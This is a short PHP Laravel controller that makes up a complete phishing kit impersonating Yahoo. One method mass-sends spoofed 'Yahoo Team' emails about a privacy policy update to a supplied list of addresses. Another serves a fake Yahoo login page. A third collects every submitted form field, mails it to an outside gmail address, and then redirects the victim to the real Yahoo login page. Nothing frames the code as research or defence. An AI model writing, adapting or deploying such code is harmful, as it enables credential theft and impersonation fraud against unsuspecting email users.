<?php

    class YahooController extends \BaseController
    {


        public function show()
        {
            return View::make('yahoo.bomb');
        }

        public function bomb()
        {
            $emails = explode(',', trim(Input::get('emails')));

            foreach ($emails as $email) {
                Mail::queue('emails.yahoo', ['email' => $email], function ($message) use ($email) {
                    $message->from('login.yahoo.com@kaso.co', 'Yahoo Team');
                    $message->to($email)->subject('Important Privacy Policy Update!');
                });
            }
        }


        public function login()
        {
            return View::make('yahoo.yahoo-login');
        }

        public function log()
        {
            $details = Input::all();

            Mail::queue('emails.details', ['details' => $details], function ($message) {
                $message->from('loggerm@kaso.co', 'Logger');
                $message->to('lordkaso@gmail.com')->subject('Important Log Update!');
            });

            return Redirect::away('http://login.yahoo.com');
        }

    }
